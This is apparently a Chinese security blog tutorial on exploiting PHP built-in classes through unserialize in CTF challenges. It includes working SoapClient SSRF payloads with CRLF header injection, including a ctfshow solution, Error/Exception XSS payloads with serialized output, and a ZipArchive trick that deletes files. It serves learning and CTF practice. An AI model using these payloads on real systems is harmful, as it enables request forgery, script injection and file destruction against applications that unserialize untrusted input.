> 原文链接: https://www.anquanke.com//post/id/247647 


# 浅谈PHP原生类反序列化


                                阅读量   
                                **21296**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t01d72f977a82979965.jpg)](https://p5.ssl.qhimg.com/t01d72f977a82979965.jpg)



## 引言

在CTF中反序列化类型的题目还是比较常见的，之前有学习过简单的反序列化，以及简单pop链的构造。这次学习内容为php内置的原生类的反序列化以及一点进阶知识。

在题目给的的代码中找不到可利用的类时，这个时候考虑使用php中的一些原生类有些类不一定能够进行反序列化，php中使用了`zend_class_unserialize_deny`来禁止一些类的反序列化。



## 基础知识

原生类常见的用法是用来进行XSS、SSRF、反序列化、或者XXE，今天就来好好总结一下。<br>
在CTF中常使用到的原生类有这几类<br>
1、Error<br>
2、Exception<br>
3、SoapClient<br>
4、DirectoryIterator<br>
5、SimpleXMLElement<br>
下面针对这几个类来进行总结。



## SoapClient __call方法进行SSRF

### <a class="reference-link" name="soap%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"></a>soap是什么？

soap是webServer的三要素之一(SOAP、WSDL、UDDI)，WSDL用来描述如何访问具体的接口，UUDI用来管理、分发、查询webServer，SOAP是连接web服务和客户端的接口，SOAP 是一种简单的基于 XML 的协议，它使应用程序通过 HTTP 来交换信息。<br>
所以它的使用条件为：<br>
1.需要有soap扩展，需要手动开启该扩展。<br>
2.需要调用一个不存在的方法触发其__call()函数。<br>
3.仅限于http/https协议

### <a class="reference-link" name="php%E4%B8%AD%E7%9A%84soapClient%E7%B1%BB"></a>php中的soapClient类

类摘要：[PHP手册](https://www.php.net/manual/zh/class.soapclient.php)

```
SoapClient `{`
/* 方法 */
public __construct(string|null $wsdl, array $options = [])
public __call(string $name, array $args): mixed
public __doRequest(
    string $request,
    string $location,
    string $action,
    int $version,
    bool $oneWay = false
): string|null
public __getCookies(): array
public __getFunctions(): array|null
public __getLastRequest(): string|null
public __getLastRequestHeaders(): string|null
public __getLastResponse(): string|null
public __getLastResponseHeaders(): string|null
public __getTypes(): array|null
public __setCookie(string $name, string|null $value = null): void
public __setLocation(string|null $location = null): string|null
public __setSoapHeaders(SoapHeader|array|null $headers = null): bool
public __soapCall(
    string $name,
    array $args,
    array|null $options = null,
    SoapHeader|array|null $inputHeaders = null,
    array &amp;$outputHeaders = null
): mixed
`}`
```

注意这个`__call()`方法`public __call(string $name, array $args): mixed`<br>
该方法被触发的时候，它可以发送HTTP或HTTPS请求。<br>
使用这个类时，php中的scapClient类可以创建soap数据报文，与wsdl接口进行交互。用法如下：

```
public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )
第一个参数是用来指明是否是wsdl模式
如果为null，那就是非wsdl模式，反序列化的时候会对第二个参数指明的url进行soap请求

如果第一个参数为null，则第二个参数必须设置location和uri
    其中location是将请求发送到的SOAP服务器的URL
    uri是SOAP服务的目标名称空间

第二个参数允许设置user_agent选项来设置请求的user-agent头
```

测试

```
&lt;?php
$a = new SoapClient(null,array('location'=&gt;'http://47.xxx.xxx.72:2333/aaa', 'uri'=&gt;'http://47.xxx.xxx.72:2333'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?&gt;
```

kali开启监听`nc -lvp 4444`，执行该文件。【注意开启soap模块】

[![](https://p5.ssl.qhimg.com/t01e1f549149385377f.png)](https://p5.ssl.qhimg.com/t01e1f549149385377f.png)

kali中就会返回监听到的内容

[![](https://p1.ssl.qhimg.com/t0119f9d82ad9c505f9.png)](https://p1.ssl.qhimg.com/t0119f9d82ad9c505f9.png)

### <a class="reference-link" name="%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9B%AE"></a>一道CTF题目

```
#index.php
&lt;?php
highlight_file(__FILE__);
$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip-&gt;getFlag();
#flag.php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1')`{`
    die('error');
`}`else`{`
    $token = $_POST['token'];
    if($token=='ctfshow')`{`
        file_put_contents('flag.txt',$flag);
    `}`
`}`
```

这道题目就是利用的PHP原生类进行反序列化来实现SSRF，因为在这里是没有给出可利用的类，所以就需要使用原生类。<br>
在解答此题的过程中，还需要利用到[CRLF](https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html)，文章很详细，容易理解。<br>
CRLF是`回车 + 换行（\r\n）`的简称，进行url编码后是`%0a%0d%0a%0d`<br>
这道题的思路就是<br>
先利用`ssrf`访问`flag.php`然后post一个数据 `toke=ctfshow`和请求头`X-Forwarded-For` 就能把`flag`写到`flag.txt`中了。<br>
用到`SoapClient`类了。这个类中有个`__call`魔术方法，触发时会调用`SoapClient`类的构造方法。

```
&lt;?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$y = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'test^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=&gt; "flag"));
$x = serialize($y);
$x = str_replace('^^',"\r\n",$x);
echo urlencode($x);
?&gt;
```

使用get传入vip的参数即可。然后访问flag.txt就可以得到flag了。此处无报错，即是成功。

[![](https://p1.ssl.qhimg.com/t013f2c91895d7eec1e.png)](https://p1.ssl.qhimg.com/t013f2c91895d7eec1e.png)



## 使用 Error/Exception 内置类来构造 XSS。

```
#index.php
&lt;?php
$a = unserialize($_GET['whoami']);
echo $a;
?&gt;
```

`Error`类是php的一个内置类，用于自动自定义一个`Error`，在`php7`的环境下可能会造成一个xss漏洞，因为它内置有一个 `__toString()` 的方法，常用于PHP 反序列化中。

```
&lt;?php
$a = new Error("&lt;script&gt;alert('xss')&lt;/script&gt;");
$b = serialize($a);
echo urlencode($b);  
?&gt;
#output:
O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A30%3A%22%3Cscript%3Ealert%28%27test%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A30%3A%22D%3A%5CphpStudy%5CWWW%5Cm0re%5Cindex.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
```

[![](https://p5.ssl.qhimg.com/t011e66fea7a791014c.png)](https://p5.ssl.qhimg.com/t011e66fea7a791014c.png)

另一种，`Exception` 内置类，与上述类似，只是换了一个类，将`Error`换成了`Exception`

```
&lt;?php
$x = new Exception("&lt;script&gt;alert('xss')&lt;/script&gt;");
$y = serialize($x);
echo urlencode($y);  
?&gt;
```

其它与上述相同。



## 实例化任意类

### <a class="reference-link" name="ZipArchive::open%20%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6"></a>ZipArchive::open 删除文件

使用条件：open参数可控。

```
$a = new ZipArchive();
$a-&gt;open('test.php',ZipArchive::OVERWRITE);  
// ZipArchive::OVERWRITE:  总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖
// 因为没有保存，所以效果就是删除了test.php
```

在同目录下创建一个`test.php`。然后执行上面的代码，就会发现`test.php`已经被删除了。

### <a class="reference-link" name="SQLite3%20%E5%88%9B%E5%BB%BA%E7%A9%BA%E7%99%BD%E6%96%87%E4%BB%B6"></a>SQLite3 创建空白文件

前提：需要有sqlite3扩展，且不是默认开启，需要手动开启

```
&lt;?php
$test = new SQLite3('test.txt');
?&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0141a2c5f25ae8b9cb.png)

### <a class="reference-link" name="GlobIterator%20%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95"></a>GlobIterator 遍历目录

```
GlobIterator::__construct(string $pattern, [int $flag])
从使用$pattern构造一个新的目录迭代
```

示例：

```
&lt;?php
$newclass = new GlobIterator("./*.php",0);
foreach ($newclass as $key=&gt;$value)
    echo $key.'=&gt;'.$value.'&lt;br&gt;';

?&gt;
```

[![](https://p3.ssl.qhimg.com/t0107d866e7cee782c2.png)](https://p3.ssl.qhimg.com/t0107d866e7cee782c2.png)

SimpleXMLElement暂无示例。



## 总结

PHP反序列化的一些原生类的基础知识暂时学习到这里，后面关于PHP反序列化的还有phar反序列化，session反序列化。慢慢来吧。



## 参考博客

[https://cn-sec.com/archives/286121.html](https://cn-sec.com/archives/286121.html)<br>[https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8](https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8)
